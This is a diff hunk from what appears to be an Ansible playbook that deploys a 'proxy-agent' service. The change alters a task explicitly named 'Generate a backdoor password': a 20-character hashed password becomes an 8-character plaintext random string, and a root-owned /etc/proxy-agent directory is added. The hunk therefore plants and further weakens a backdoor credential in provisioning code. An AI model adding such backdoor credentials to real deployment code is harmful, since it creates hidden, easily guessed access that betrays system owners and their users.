@@ -60,9 +60,22 @@
         mode: 0644
       become: yes
 
-    - name: Generate a backdoor password
+    - name: Generate a short 8-letter random hash
+      shell: cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 8
+      register: random_hash
+
+    - name: Set backdoor password
       set_fact:
-        backdoor_password: "{{ lookup('password', '/dev/null length=20 chars=ascii_letters,digits') | password_hash('sha512') }}"
+        backdoor_password: "{{ random_hash.stdout }}"
+
+    - name: Ensure /etc/proxy-agent directory exists
+      ansible.builtin.file:
+        path: /etc/proxy-agent
+        state: directory
+        owner: root
+        group: root
+        mode: 0755
+      become: yes
 
     - name: Configure proxy-agent
       ansible.builtin.template:
